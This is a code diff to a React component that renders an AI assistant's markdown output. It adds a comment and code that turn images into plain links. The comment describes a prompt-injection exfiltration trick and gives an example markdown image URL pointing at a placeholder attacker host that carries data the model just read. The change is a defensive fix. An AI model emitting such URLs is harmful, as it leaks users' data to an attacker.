@@ -11,6 +11,12 @@ import { cn } from "@/lib/utils";
  * No `rehype-raw`: the model's output is untrusted text, and enabling raw HTML
  * here would turn a prompt injection into script execution. react-markdown
  * escapes HTML by default and that default is the point.
+ *
+ * Images are rendered as links rather than loaded. A model that has been
+ * talked into emitting `![](https://attacker/?q=<something it just read>)`
+ * would otherwise have the browser fetch that URL on render, with no click and
+ * nothing on screen - which is a data exfiltration channel, not a picture. The
+ * assistant has no legitimate reason to embed a remote image in a reply.
  */
 export default function AiMarkdown({
 	content,
@@ -52,6 +58,17 @@ export default function AiMarkdown({
 					a: ({ href, children }) => (
 						<a href={href} target="_blank" rel="noopener noreferrer nofollow">
 							{children}
+						</a>
+					),
+					// Never fetched on render - see the note above.
+					img: ({ src, alt }) => (
+						<a
+							href={typeof src === "string" ? src : undefined}
+							target="_blank"
+							rel="noopener noreferrer nofollow"
+							className="inline-flex items-center gap-1 underline underline-offset-2"
+						>
+							{alt?.trim() || "image link"}
 						</a>
 					),
 				}}
